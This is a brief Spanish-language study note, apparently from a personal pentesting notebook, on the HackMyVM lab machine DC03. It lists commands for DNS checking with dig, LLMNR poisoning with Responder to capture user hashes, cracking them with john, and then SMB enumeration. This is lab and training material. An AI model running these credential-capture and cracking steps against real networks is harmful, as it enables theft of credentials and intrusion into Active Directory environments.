- Tags : #window #window_explotacion #llmnr_poisoning #recursos #recurso_hackmyvm  #dig_tool #tool_responder #tool_john #active_directory 

**Recurso**: Maquina DC03 hackmyvm

Para esto es necesario se necesita conocer el dominio y el ip del dominio y agregarlo en nuestro /etc/hosts este dominio

Con dig hacemos una consulta al dominio con dig
```bash
dig NS DOMINIO @ip_del_dominio #Para serciorarnos que esta funcional
```

En caso de no estar funcional podemos efectuar un ataque LLMNR con la herramienta responder para intentar capturar algún hash de usuario para intentar descifrarlo 

```bash
#Nos ponemos a la escucha para intentar capturar los hash de usuarios
sudo responder -I eth0 
```

Una vez capturado el hash nos copiamos el hash en un file y con john intentar cracker el hash
```bash
nano hash.txt #copiamos el hash capturado en el fichero
john --wordlist=/dir/rokyu.txt hash #intentamos cracker el hash
```

Conn user y pass pues buscaríamos puntos de enumeración como smb y haríamos los ataque s relacionados a este protocolo